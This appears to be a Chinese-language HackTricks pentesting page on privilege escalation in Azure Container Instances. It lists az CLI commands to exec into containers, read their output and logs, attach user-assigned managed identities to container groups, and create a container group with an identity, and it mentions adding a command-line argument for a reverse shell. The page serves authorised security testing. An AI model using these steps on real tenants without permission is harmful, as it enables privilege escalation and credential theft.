# Az - Azure Container Instances Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Container Instances

有关更多信息，请查看：

{{#ref}}
../az-services/az-container-instances.md
{{#endref}}

### `Microsoft.ContainerInstance/containerGroups/read`, `Microsoft.ContainerInstance/containerGroups/containers/exec/action`

这些权限允许用户在运行的容器中**执行命令**。如果容器附加了任何托管身份，这可以用于**提升权限**。当然，也可以访问源代码和存储在容器内的任何其他敏感信息。

执行`ls`并获取输出是如此简单：
```bash
az container exec --name <container-name> --resource-group <res-group>  --exec-command 'ls'
```
也可以通过以下方式**读取容器的输出**：
```bash
az container attach --name <container-name> --resource-group <res-group>
```
或使用以下命令获取日志：
```bash
az container logs --name <container-name> --resource-group <res-group>
```
### `Microsoft.ContainerInstance/containerGroups/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

这些权限允许**将用户管理的身份**附加到容器组。这对于在容器中提升权限非常有用。

要将用户管理的身份附加到容器组：
```bash
az rest \
--method PATCH \
--url "/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ContainerInstance/containerGroups/<container-name>?api-version=2021-09-01" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-namaged-identity-name>": {}
}
}
}' \
--headers "Content-Type=application/json"
```
### `Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.ContainerInstance/containerGroups/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

这些权限允许**创建或更新一个容器组**，并附加一个**用户管理的身份**。这对于在容器中提升权限非常有用。
```bash
az container create \
--resource-group <res-group>> \
--name nginx2 \
--image mcr.microsoft.com/oss/nginx/nginx:1.9.15-alpine \
--assign-identity "/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-namaged-identity-name>" \
--restart-policy OnFailure \
--os-type Linux \
--cpu 1 \
--memory 1.0
```
此外，还可以更新现有的容器组，例如添加 **`--command-line` 参数** 以实现反向 shell。

{{#include ../../../banners/hacktricks-training.md}}
